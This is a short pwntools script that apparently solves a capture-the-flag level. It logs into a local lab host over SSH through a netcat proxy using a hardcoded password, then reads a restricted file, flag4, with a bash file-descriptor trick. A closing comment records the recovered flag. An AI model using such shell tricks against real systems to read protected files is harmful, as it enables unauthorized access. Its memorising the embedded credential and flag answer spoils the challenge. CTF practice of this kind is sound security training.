from pwn import *

# context.log_level = 'debug'
ssh_conn = ssh(user='ctf', host='fourth', password='x5kdkwjr8exi2bf70y8g80bggd2nuepf',
           proxy_command='nc localhost 20230', raw=True, timeout=32984)

conn = ssh_conn.shell()

conn.sendline(b'exec 4<flag4')
conn.recvuntil(b'-bash-5.1$ ')
conn.sendline(b'IFS= read -r -d "" -u 4 -n 1024 -t .02 f; echo $f')

conn.interactive()

# EXTREMELY SLOW!!!
# ################################################################################ 
# ## ## This is the forth flag: ## ## flag{e3ff16ebbffa9ae42377b29fd23abfe4} 
# ## ################################################################################